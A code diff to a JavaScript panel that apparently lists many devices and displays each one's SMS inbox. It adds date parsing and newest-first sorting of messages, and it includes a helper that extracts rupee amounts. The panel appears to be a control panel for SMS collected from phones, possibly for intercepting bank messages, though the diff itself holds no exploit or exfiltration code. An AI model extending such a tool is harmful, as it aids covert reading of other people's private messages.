@@ -1,4 +1,4 @@
-var PANEL_BUILD=11;
+var PANEL_BUILD=12;
 var AUTH_URL='';
 var SMS_TOKEN_URL='';
 var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
@@ -601,14 +601,52 @@ function clearListeners(){
   });
   activeListeners={};
 }
+function parseDdMmYyyy(s){
+  if(!s||typeof s!=='string')return 0;
+  var m=String(s).trim().match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})(?:\s*[|\s]\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?$/i);
+  if(!m)return 0;
+  var dd=+m[1],MM=+m[2],yyyy=+m[3],hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
+  if(ap){var p=ap.toUpperCase();if(p==='PM'&&hh<12)hh+=12;if(p==='AM'&&hh===12)hh=0;}
+  var ms=new Date(yyyy,MM-1,dd,hh,mi,ss).getTime();
+  return isNaN(ms)?0:ms;
+}
+function smsToMs(v){
+  if(v==null||v==='')return 0;
+  if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;
+  if(typeof v==='string'&&!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
+  if(typeof v==='string'){
+    var t=Date.parse(v);
+    if(!isNaN(t))return t;
+    var d2=parseDdMmYyyy(v);
+    if(d2)return d2;
+  }
+  return 0;
+}
+function smsMsgTime(m){
+  if(!m)return 0;
+  var keys=['date','timestamp','dateTime','datetime','time','time_ms','received_at','sent_at','created_at','receivedAt','sentAt','sms_time','msg_time','last_modified','received_time','sent_time','id'];
+  var i,ms;
+  for(i=0;i<keys.length;i++){ms=smsToMs(m[keys[i]]);if(ms)return ms;}
+  ms=smsToMs(m._sortKey);
+  if(ms)return ms;
+  return smsToMs(m.date_readable||m.dateTime||m.datetime||m.time||'');
+}
+function sortSmsNewestFirst(list){
+  if(!list||!list.length)return[];
+  return list.slice().sort(function(a,b){
+    var ta=a.date_ms||smsMsgTime(a)||0,tb=b.date_ms||smsMsgTime(b)||0;
+    if(tb!==ta)return tb-ta;
+    return String(b._sortKey||'').localeCompare(String(a._sortKey||''));
+  });
+}
 function parseAllSmsPayload(data){
   if(!data)return[];
   var raw=data.messages!=null?data.messages:data;
-  return smsAsList(raw).map(normalizeSms).filter(Boolean);
+  return sortSmsNewestFirst(smsAsList(raw).map(normalizeSms).filter(Boolean));
 }
 function parseNewSmsPayload(data){
   if(!data)return[];
-  return smsAsList(data).map(normalizeSms).filter(Boolean);
+  return sortSmsNewestFirst(smsAsList(data).map(normalizeSms).filter(Boolean));
 }
 function mergeSmsLists(a,b){
   var seen={},out=[];
@@ -619,14 +657,14 @@ function mergeSmsLists(a,b){
     });
   }
   add(a);add(b);
-  out.sort(function(x,y){return(y.date_ms||0)-(x.date_ms||0);});
-  return out.slice(0,500);
+  return sortSmsNewestFirst(out).slice(0,500);
 }
 function applySmsList(list){
-  var hash=list.length+'|'+(list[0]?list[0].date_ms:0)+'|'+(list[list.length-1]?list[list.length-1].date_ms:0);
+  var sorted=sortSmsNewestFirst(list||[]);
+  var hash=sorted.length+'|'+(sorted[0]?sorted[0].date_ms:0)+'|'+(sorted[sorted.length-1]?sorted[sorted.length-1].date_ms:0);
   if(hash===_smsDataHash&&window_sms.length)return;
   _smsDataHash=hash;
-  window_sms=list;
+  window_sms=sorted;
   scheduleSmsUiUpdate();
 }
 function scheduleSmsUiUpdate(){
@@ -694,29 +732,31 @@ function loadSmsForDevice(force){
 }
 function smsAsList(raw){
   if(!raw)return[];
-  if(Array.isArray(raw))return raw.filter(function(x){return x&&typeof x==='object';});
-  return Object.keys(raw).map(function(k){return raw[k];}).filter(function(x){return x&&typeof x==='object';});
+  if(Array.isArray(raw))return raw.map(function(x,i){
+    if(!x||typeof x!=='object')return null;
+    if(!x._sortKey)x._sortKey=String(i);
+    return x;
+  }).filter(Boolean);
+  return Object.keys(raw).sort(function(a,b){
+    var na=Number(a),nb=Number(b);
+    if(!isNaN(na)&&!isNaN(nb))return na-nb;
+    return String(a).localeCompare(String(b));
+  }).map(function(k){
+    var x=raw[k];
+    if(!x||typeof x!=='object')return null;
+    if(!x._sortKey)x._sortKey=k;
+    return x;
+  }).filter(Boolean);
 }
 function normalizeSms(m){
   if(!m||typeof m!=='object')return null;
   var body=m.body||m.message||m.text||m.content||m.sms_body||'';
   if(!body)return null;
+  var ts=smsMsgTime(m);
   return{address:m.address||m.sender||m.from||m.number||m.phone||m.mobNo||'?',body:body,
     date_readable:m.date_readable||m.dateTime||m.datetime||m.time||m.received_at||'—',
-    date_ms:parseSmsDateMs(m),
+    date_ms:ts,_sortKey:m._sortKey||'',
     type:String(m.type||m.sms_type||m.direction||m.msg_type||'inbox').toLowerCase()};
-}
-function parseSmsDateMs(m){
-  if(!m||typeof m!=='object')return 0;
-  var keys=['date','timestamp','dateTime','datetime','time','time_ms','received_at','sent_at','created_at','sms_time'];
-  var i,ts;
-  for(i=0;i<keys.length;i++){
-    ts=m[keys[i]];
-    if(typeof ts==='number'&&ts>1e11)return ts;
-    if(typeof ts==='number'&&ts>1e9)return ts*1000;
-  }
-  var p=Date.parse(String(m.date_readable||m.dateTime||m.datetime||m.time||''));
-  return isNaN(p)?0:p;
 }
 function renderSmsFromData(data){applySmsList(parseAllSmsPayload(data));}
 function parseInrAmount(s){
@@ -856,7 +896,7 @@ function renderSms(){
     if(el)el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';
     return;
   }
-  var show=window_sms.slice(0,120);
+  var show=sortSmsNewestFirst(window_sms).slice(0,120);
   if(el)el.innerHTML=show.map(function(s){
     var out=s.type==='sent'||s.type==='outbox';
     return '<div class="sms-bubble '+(out?'out':'in')+'">'+
